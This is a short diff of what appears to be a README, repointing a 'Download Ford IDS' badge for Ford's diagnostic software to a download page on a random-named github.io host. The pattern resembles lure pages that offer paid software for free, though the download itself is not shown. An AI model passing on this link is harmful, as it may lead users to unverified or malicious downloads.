@@ -2,7 +2,7 @@
 
 ## 📥 Ford IDS
 
-[![⬇️Ford IDS](https://img.shields.io/badge/Download-Ford%20IDS-blue?style=for-the-badge&logo=ford)](https://ford-ids.github.io/.github)
+[![⬇️Ford IDS](https://img.shields.io/badge/Download-Ford%20IDS-blue?style=for-the-badge&logo=ford)](https://iurcuhowtar.github.io/.github/ford-ids)
 
 ---
 
